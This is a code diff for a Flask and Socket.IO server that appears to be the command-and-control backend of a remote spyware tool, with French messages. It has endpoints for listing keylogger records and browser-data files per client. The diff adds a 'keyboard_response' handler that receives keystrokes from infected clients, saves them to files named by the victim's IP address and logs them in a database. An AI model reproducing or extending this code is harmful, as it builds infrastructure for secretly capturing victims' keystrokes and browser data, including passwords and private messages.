@@ -13,7 +13,6 @@ from config.config import Config
 from config.extensions import db
 from models import Client, Command, CommandType
 
-
 app = Flask(__name__)
 app.config.from_object(Config)
 db.init_app(app)
@@ -214,6 +213,7 @@ class GetBrowserDataFile(Resource):
         else:
             return {'status': 'error', 'message': 'Fichier de données du navigateur non trouvé.'}, 404
 
+
 @keylogger_ns.route('/client/<int:client_id>')
 class GetKeyloggersByClientId(Resource):
     @jwt_required()
@@ -224,6 +224,7 @@ class GetKeyloggersByClientId(Resource):
         for keylogger in keyloggers:
             keylogger.date_created = keylogger.date_created.strftime('%d/%m/%Y à %H:%M:%S')
         return keyloggers, 200
+
 
 @keylogger_ns.route('/log/<int:keylogger_id>')
 class GetKeyloggerLog(Resource):
@@ -318,6 +319,23 @@ def handle_browser_data(data):
                               client_id=client.id,
                               file_path=file_path,
                               browser_name=browser)
+        db.session.add(new_command)
+        db.session.commit()
+
+
+@socketio.on('keyboard_response')
+def handle_keyboard(data):
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        keylogger_dir = f"keyloggers/{client.ip}"
+        os.makedirs(keylogger_dir, exist_ok=True)
+        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
+        keylogger_path = f"{keylogger_dir}/{file_name}"
+        with open(keylogger_path, 'w', encoding='utf-8') as f:
+            for key in data:
+                f.write(f"{key[0]} - {key[1]} - {key[2]}\n")
+        new_command = Command(type=CommandType.KEYLOGGER, client_id=client.id, file_path=keylogger_path)
         db.session.add(new_command)
         db.session.commit()
 
